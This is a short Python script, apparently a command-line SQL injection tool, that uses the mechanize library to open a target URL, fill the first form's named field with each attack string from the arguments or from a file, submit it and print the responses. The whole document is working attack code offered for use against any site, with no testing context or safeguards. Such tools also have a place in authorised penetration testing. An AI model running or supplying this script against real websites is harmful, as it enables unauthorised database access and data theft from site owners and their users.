import sys, os, mechanize

request = mechanize.Browser()

def execute_attack(url, control_name, sql_attack_str):
    print(f"Attack on {url} with vector {sql_attack_str}")
    request.open(url)
    request.select_form(nr=0)
    request[control_name] = sql_attack_str
    response = request.submit()
    content = response.read()
    print(content)

def start_attack(url, control_name, attack_queries):
  for query in attack_queries:
    execute_attack(url, control_name, query)

if __name__ == '__main__':
  if  len(sys.argv) < 3:
    print("Invalid input arguments")
    print("python sql-injection.py <targetURL> <control_name> <attackString1[,attackString2,attackString3]>")
  else:
    target_url = sys.argv[1]
    control_name = sys.argv[2]
    attack_queries = []
    if len(sys.argv) == 3:
      attack_query_file_path = os.path.join(sys.path[0],"sql-queries.txt")
      with open(attack_query_file_path,'r') as f:
        for query in f:
          attack_queries.append(query.strip())
    else:
      for query in sys.argv[3].split(','):
        attack_queries.append(query.strip())
    start_attack(target_url,control_name, attack_queries)